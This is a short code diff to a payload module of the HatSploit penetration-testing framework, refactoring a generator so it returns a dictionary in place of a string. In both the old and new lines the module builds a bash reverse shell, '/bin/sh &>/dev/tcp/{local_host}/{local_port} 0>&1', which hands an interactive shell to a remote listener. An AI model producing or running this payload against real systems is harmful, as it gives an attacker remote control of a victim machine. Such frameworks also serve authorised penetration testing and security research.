@@ -53,4 +53,8 @@ class HatSploitPayload(HatSploitPayload):
     
     def generate(self):
         local_host, local_port = self.parser.parse_options(self.options)
-        return f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1"
+
+        self.data['payload'] = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1"
+        self.data['execute'] = self.data['payload']
+
+        return self.data
